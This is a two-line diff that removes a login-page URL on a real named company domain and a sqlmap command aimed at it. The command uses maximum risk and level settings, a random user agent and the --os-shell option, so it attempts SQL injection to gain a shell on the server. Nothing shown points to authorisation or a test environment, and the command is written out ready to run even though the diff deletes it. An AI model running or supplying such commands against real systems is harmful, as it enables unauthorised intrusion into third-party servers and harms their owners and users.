@@ -1,2 +1,0 @@
-https://djlogin.dowjones.com/login.asp?productname=rnc
-python ../sqlmap/sqlmap.py -u "https://djlogin.dowjones.com/login.asp?productname=rnc" --risk 3 --level 5 --batch --random-agent --os-shell 
